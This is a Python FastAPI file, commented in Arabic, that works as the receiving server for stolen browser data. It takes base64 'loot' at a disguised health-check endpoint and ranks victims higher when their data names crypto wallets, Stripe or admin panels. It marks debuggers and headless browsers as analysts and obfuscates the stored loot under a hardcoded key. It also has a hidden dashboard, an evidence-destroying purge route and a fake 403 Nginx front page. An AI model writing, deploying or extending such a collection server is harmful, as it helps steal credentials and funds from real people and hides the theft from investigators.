from fastapi import FastAPI, Request, HTTPException, Response, Query
from fastapi.middleware.cors import CORSMiddleware
from psycopg2.extras import RealDictCursor
import psycopg2
import os, json, base64, datetime, hashlib

app = FastAPI()

# --- إعدادات التحكم المطلق ---
DB_URL = os.environ.get("DATABASE_URL")
MASTER_KEY = "Morteza_Overlord_2026" # مفتاح التشفير الداخلي
DESTRUCT_PATH = "nuclear_delete_all_data_99" # رابط التدمير الذاتي

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- 1. محرك التشفير الداخلي (Internal Encryption) ---
def xor_cipher(data: str):
    """تشفير البيانات بمفتاح متغير لضمان عدم قراءتها حتى من داخل DB"""
    key = MASTER_KEY
    return "".join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data)])

# --- 2. محرك التصنيف الذكي (The Intelligence Engine) ---
class SovereignAI:
    @staticmethod
    def evaluate_target(decoded_data, ip):
        score = 0
        loot = decoded_data.get('loot', {})
        hw = decoded_data.get('hw', {})
        
        # كشف المحللين (Red Flags)
        if decoded_data.get('sec', {}).get('dbg'): score -= 100
        if "headless" in decoded_data.get('net', {}).get('ua', '').lower(): score -= 100
        
        # كشف الصيدات الثمينة (Gold Flags)
        storage_str = json.dumps(loot).lower()
        if any(x in storage_str for x in ['binance', 'metamask', 'trustwallet', 'stripe']): score += 150
        if any(x in storage_str for x in ['admin', 'wp-admin', 'dashboard']): score += 80
        if hw.get('mem', 0) and int(hw.get('mem', 0)) > 16: score += 50 # جهاز قوي = صاحبه مهم
        
        if score > 100: return "HIGH_VALUE_TARGET"
        if score < 0: return "SUSPICIOUS_ANALYZER"
        return "NORMAL_USER"

# --- 3. إدارة قاعدة البيانات ---
def get_db_conn():
    return psycopg2.connect(DB_URL, sslmode='require')

@app.on_event("startup")
def boot_system():
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS sovereign_omega_loot (
            id SERIAL PRIMARY KEY,
            target_id TEXT,
            gift_tag TEXT,
            ip_address TEXT,
            encrypted_loot TEXT,
            target_class TEXT,
            metadata JSONB,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.commit()
    cur.close()
    conn.close()

# --- 4. بوابة الاستقبال الاستخباراتية (The Gate) ---
@app.post("/api/v1/sys/health/sync")
async def inbound_gate(request: Request):
    ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0]
    try:
        raw = await request.body()
        decoded = json.loads(base64.b64decode(raw).decode('utf-8'))
        
        # تصنيف الهدف برمجياً
        target_class = SovereignAI.evaluate_target(decoded, ip)
        
        # تشفير البيانات قبل وضعها في القاعدة (Double Layer)
        secure_loot = base64.b64encode(xor_cipher(json.dumps(decoded)).encode()).decode()

        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO sovereign_omega_loot (target_id, gift_tag, ip_address, encrypted_loot, target_class, metadata)
            VALUES (%s, %s, %s, %s, %s, %s)
        """, (decoded.get('tid'), decoded.get('tag'), ip, secure_loot, target_class, json.dumps(decoded.get('hw'))))
        conn.commit()
        cur.close()
        conn.close()
        
        return {"status": "ok", "sys_code": hashlib.md5(ip.encode()).hexdigest()}
    except:
        return {"status": "ok"}

# --- 5. لوحة التحكم (The War Room) ---
@app.get("/api/v1/sys/health/report")
async def get_war_room_data(key: str = Query(None)):
    if key != MASTER_KEY: return Response(status_code=404) # حماية إضافية للداشبورد
    
    conn = get_db_conn()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute("SELECT * FROM sovereign_omega_loot ORDER BY created_at DESC")
    rows = cur.fetchall()
    
    # فك التشفير للعرض فقط
    for row in rows:
        try:
            decrypted = xor_cipher(base64.b64decode(row['encrypted_loot']).decode())
            row['decrypted_data'] = json.loads(decrypted)
        except: row['decrypted_data'] = "DECRYPTION_ERROR"
        
    cur.close()
    conn.close()
    return rows

# --- 6. نظام التدمير الذاتي (Nuclear Option) ---
@app.get(f"/{DESTRUCT_PATH}")
async def self_destruct(confirm: str = Query(None)):
    if confirm == "YES_PURGE_EVERYTHING":
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("DROP TABLE sovereign_omega_loot;")
        conn.commit()
        cur.close()
        conn.close()
        return {"message": "System Purged. All evidence destroyed."}
    return {"message": "Waiting for confirmation..."}

# --- 7. التمويه (The Fake Front) ---
@app.get("/")
async def front_page():
    return Response(content="<h1>403 Forbidden</h1><p>Nginx/2.4.1</p>", status_code=403)
